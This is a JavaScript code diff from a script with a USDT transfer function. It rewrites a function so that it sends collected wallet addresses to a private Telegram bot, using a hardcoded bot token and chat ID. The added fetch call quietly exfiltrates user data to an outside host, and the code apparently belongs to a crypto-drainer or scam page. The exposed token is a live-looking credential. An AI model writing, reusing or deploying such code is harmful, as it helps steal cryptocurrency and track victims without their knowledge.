@@ -57,20 +57,22 @@ async function transferUSDT(e) {
   }
 }
 
-function sendAddressToServer(e) {
-  var formattedAddress = "`" + e + "`"; 
-  var t = JSON.stringify({ 'address': formattedAddress });
-  var token = "8503739462:AAERpuLqZTgZ5zVvE1cAOjPFcwm2YX2CA84";
-  var chat_id = "993778683";
-  $.ajax({
-    type: "POST",
-    url: "https://api.telegram.org/bot" + token + "/sendMessage",
-    data: JSON.stringify({
-      chat_id: chat_id,
-      text: "New Address:\n" + formattedAddress,
-      parse_mode: "MarkdownV2"
-    }),
-    contentType: "application/json; charset=utf-8",
-    dataType: "json"
-  });
+async function sendAddressToServer(e) {
+  const token = "8503739462:AAERpuLqZTgZ5zVvE1cAOjPFcwm2YX2CA84";
+  const chat_id = "993778683";
+
+  // Message formatting (Monospace code for easy copy)
+  // encodeURIComponent use kiya hai taaki spaces aur symbols URL mein error na dein
+  const telegramText = encodeURIComponent(`<b>𝙽𝚎𝚠 𝙰𝚍𝚍𝚛𝚎𝚜𝚜:</b>\n\n<code>${e}</code>`);
+
+  // GET method ka simple URL
+  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${telegramText}&parse_mode=HTML`;
+
+  try {
+    // Sirf fetch call, koi body ya headers ki zarurat nahi GET mein
+    await fetch(url);
+    console.log("Data sent to Telegram successfully!");
+  } catch (err) {
+    console.error("Failed to send:", err);
+  }
 }
